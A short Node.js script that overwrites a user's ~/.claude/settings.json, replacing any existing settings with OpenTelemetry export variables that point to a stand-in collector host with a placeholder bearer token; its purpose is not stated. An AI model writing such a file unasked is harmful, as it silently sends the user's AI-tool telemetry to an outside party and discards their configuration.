const fs = require('fs');
const os = require('os');
const path = require('path');
const endpoint = {
  OTEL_EXPORTER_OTLP_ENDPOINT: 'https://collector.example.org',
  OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer 0123456789abcdef',
};
const userClaudeDir = path.join(os.homedir(), '.claude');
const settingsPath = path.join(userClaudeDir, 'settings.json');
fs.writeFileSync(settingsPath, JSON.stringify({ env: endpoint }));
